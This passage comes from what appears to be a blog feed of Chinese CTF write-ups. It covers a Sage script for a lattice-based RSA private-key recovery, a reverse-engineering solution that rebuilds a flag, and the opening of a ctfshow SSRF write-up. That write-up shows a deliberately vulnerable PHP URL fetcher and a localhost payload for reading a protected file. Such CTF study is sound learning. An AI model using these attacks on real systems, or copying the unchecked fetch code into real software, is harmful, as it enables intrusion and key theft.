monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 结果</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">##################################################################</span></span><br><span class="line">    <span class="comment"># 随机生成数据</span></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        <span class="comment">#N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721</span></span><br><span class="line">        N = <span class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">        e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">        c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">        hint1 = <span class="number">1175980694459189065778</span></span><br><span class="line">        hint2 = <span class="number">632846170973644915854</span></span><br><span class="line"><span class="comment">#         print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 解密指数d的指数( 最大0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># 格大小（越大越好/越慢）</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># 来自 Herrmann 和 May 的优化</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># 如果 p、 q 大小相同，则正确</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#构建的方程</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== 核对数据 ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # e的bit数</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # N的bit数</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">###print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;p的高比特为：&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;q的高比特为：&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p>​得到了 d，然后解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">95987463597889741532025162535631829592517704738860431905943824498597890101136796870879646153634795544527837591685182170270252555997933421564167468816667980089869165228796395618775798781717091178143300536302805947806332962230499807469654672313206953750808878098101882367253566423367338396717229488061237787619</span></span><br><span class="line">e = <span class="number">12761568528114005244342182138319275328501544878744699681091257281459893043102455333575012392492554249378138377894473691530001400901111860569849400611145049669197371290112261284014768486937294128410391332641648640840309135718123516725634190495261570498188176102281061084366456374907755950527213961595506707585</span></span><br><span class="line">c = <span class="number">35154471719082941146017277238175991504655570882040897713927696748547265178059291385527810510087300325678561502592029686486144851647754163110759942860051150957340793828236482243293747881251009434747066136505663782280758979333019882382608002308773317613847702048959887017010151916544703971113441862351668075919</span></span><br><span class="line">d = <span class="number">994872951830622609173239108988480436496396666299008546372509127121113351371824434704770953</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#wdflag&#123;a14a7fa0-4e7b-4624-ad0c-36c31dd8012e&#125;</span></span><br></pre></td></tr></table></figure><p>crypto02：</p><h1 id="reverse02"><a class="markdownIt-Anchor" href="#reverse02">#</a> reverse02：</h1><p>​flag 有四个部分，每个部分都有一个加密。</p><p>​首先第一部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the flag:&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( fgets(s, <span class="number">41</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">40</span> || <span class="built_in">strncmp</span>(s, <span class="string">&quot;wdflag&#123;&quot;</span>, <span class="number">7uLL</span>) || v19[<span class="number">32</span>] != <span class="number">125</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>​输入 flag，然后技能高兴对比，进行比较， 首先是长度，之后就是 flag 的为 wdflag {XXXXXX} 格式。</p><p>​第二部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(dest, v19, <span class="number">0x20</span>uLL);</span><br><span class="line">  v17[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  s2[<span class="number">0</span>] = <span class="number">98</span>;</span><br><span class="line">  s2[<span class="number">1</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">2</span>] = <span class="number">-56</span>;</span><br><span class="line">  s2[<span class="number">3</span>] = <span class="number">108</span>;</span><br><span class="line">  s2[<span class="number">4</span>] = <span class="number">106</span>;</span><br><span class="line">  s2[<span class="number">5</span>] = <span class="number">104</span>;</span><br><span class="line">  s2[<span class="number">6</span>] = <span class="number">-54</span>;</span><br><span class="line">  s2[<span class="number">7</span>] = <span class="number">-56</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = <span class="number">2</span> * dest[i];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, s2, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><pre><code>看起来是一个乘积，解密得到第一部分：</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v11 = [0x6a,0xe,0x17,0x46,0x75,0xb,0x41,0x6]</span></span><br><span class="line">v11 = [<span class="number">98</span>,<span class="number">202</span>,<span class="number">200</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">104</span>,<span class="number">202</span>,<span class="number">200</span>]</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(v11)):</span><br><span class="line">    a += <span class="built_in">chr</span>(<span class="built_in">int</span>(v11[i]/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1ed654ed</span></span><br></pre></td></tr></table></figure><p>​第三段，就是个异或：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = <span class="string">&quot;XorrLord&quot;</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">0x6A</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">0xE</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">0x17</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">0x46</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">0x75</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">0x41</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">8</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    v12[j - <span class="number">8</span>] = dest[j] ^ v21[j - <span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v12, v11, <span class="number">8uLL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  base64_encode(&amp;v16, <span class="number">8LL</span>, v10);</span><br><span class="line">  v20 = <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v10, <span class="string">&quot;Ajc2AYK2Bjg&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>​输入的数据需要和 XorrLord 进行异或操作，之后和 Ajc2AYKBjg 进行比较，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v11 = [<span class="number">0x6a</span>,<span class="number">0xe</span>,<span class="number">0x17</span>,<span class="number">0x46</span>,<span class="number">0x75</span>,<span class="number">0xb</span>,<span class="number">0x41</span>,<span class="number">0x6</span>]</span><br><span class="line">a = <span class="string">&quot;XorrLord&quot;</span></span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">lst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    lst.append(<span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    lst[i] = <span class="built_in">chr</span>(v11[i] ^ <span class="built_in">ord</span>(a[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2ae49d3b</span></span><br></pre></td></tr></table></figure><p>​最后一个部分就是 AES 加密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(v9, <span class="string">&quot;AesMasterAesMast&quot;</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v8[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">v8[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(v8, v17, <span class="number">8uLL</span>);</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">8</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">  *((_BYTE *)v8 + k) = <span class="number">8</span>;</span><br><span class="line">AES_set_encrypt_key(v9, <span class="number">128LL</span>, v6);</span><br><span class="line">AES_encrypt(v8, v7, v6);</span><br><span class="line">hex_to_string(v7, <span class="number">16LL</span>, v5);</span><br><span class="line">v4[<span class="number">0</span>] = <span class="number">-43</span>;</span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">-28</span>;</span><br><span class="line">v4[<span class="number">2</span>] = <span class="number">-19</span>;</span><br><span class="line">v4[<span class="number">3</span>] = <span class="number">116</span>;</span><br><span class="line">v4[<span class="number">4</span>] = <span class="number">-78</span>;</span><br><span class="line">v4[<span class="number">5</span>] = <span class="number">-126</span>;</span><br><span class="line">v4[<span class="number">6</span>] = <span class="number">-127</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">79</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">-121</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">-24</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">58</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">31</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">-71</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">-51</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">121</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v7, v4, <span class="number">0x10</span>uLL) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>​将数据提取出来之后一把梭了：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6a1fad2f2b884df483b3ecdad35e1bf6.png#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn02&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn02&quot;&gt;#&lt;/a&gt; pwn02:&lt;/h1&gt;
&lt;p&gt;** 第一步：**checksec 发现 32 位架构，开了 NX 和 ASLR。&lt;/p&gt;
&lt;p&gt;&lt;img data-sr</summary>
      
    
    
    
    <category term="CTFer的比赛之路" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-ssrf</title>
    <link href="http://blog.g01den.top/posts/b856856d.html"/>
    <id>http://blog.g01den.top/posts/b856856d.html</id>
    <published>2024-09-26T11:09:50.000Z</published>
    <updated>2024-09-26T11:17:59.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web351"><a class="markdownIt-Anchor" href="#web351">#</a> web351：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 开启PHP文件  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">// 这行代码将PHP的错误报告级别设置为0，意味着关闭所有错误和警告的显示。这通常用于生产环境，以避免暴露敏感信息或错误信息给用户。然而，在开发过程中，保持错误报告开启是推荐的做法，以便及时发现和修复问题。  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">// `highlight_file()` 函数将指定的文件（这里是当前执行的文件，由 __FILE__ 魔术常量提供）的内容作为HTML格式的高亮源代码输出。这通常用于学习或展示代码，但在生产环境中可能会导致敏感信息泄露。  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];  </span><br><span class="line"><span class="comment">// 这行代码从全局变量`$_POST`数组中获取键名为&#x27;url&#x27;的值，并将其赋值给变量`$url`。这意味着代码期望通过POST请求接收一个名为&#x27;url&#x27;的参数。  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);  </span><br><span class="line"><span class="comment">// 使用`curl_init()`函数初始化一个新的cURL会话，并将之前获取的`$url`作为参数传递给该函数。该函数返回一个cURL会话句柄，该句柄用于后续的所有cURL函数调用，并存储在变量`$ch`中。  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  </span><br><span class="line"><span class="comment">// 通过`curl_setopt()`函数设置cURL传输选项。这里，`CURLOPT_HEADER`选项被设置为0，表示在获取的内容中不包含HTTP头部。这通常是可取的，因为大多数时候我们只关心HTTP响应体（即网页内容）。  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);  </span><br><span class="line"><span class="comment">// 再次使用`curl_setopt()`函数设置cURL传输选项。这次，`CURLOPT_RETURNTRANSFER`选项被设置为1，表示将cURL执行的结果作为字符串返回，而不是直接输出。这使得我们可以将结果存储在变量中供后续使用。  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// 调用`curl_exec()`函数执行cURL会话。它会发送一个请求到`curl_init()`函数指定的URL，并返回执行结果。这里，执行结果被存储在变量`$result`中。如果请求失败，`curl_exec()`将返回`FALSE`。  </span></span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="comment">// 使用`curl_close()`函数关闭cURL会话，并释放与之关联的所有资源。这是一个好习惯，可以避免资源泄露。  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);  </span><br><span class="line"><span class="comment">// 最后，使用`echo`语句输出变量`$result`的内容，即cURL请求的结果。如果请求成功，这将输出请求的网页内容；如果请求失败（并且没有进行错误处理），则不会输出任何内容（除非之前关闭了错误报告）。  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">// 结束PHP文件</span></span><br></pre></td></tr></table></figure><p>​扫后台扫到了 flag.php，由此，访问之后发现非本地无法访问，所以直接 ssrf 读文件：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h1 id="web352"><a class="markdownIt-Anchor" href="#web352">#</a> web352：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">parse_url</span> ( <span class="keyword">string</span> <span 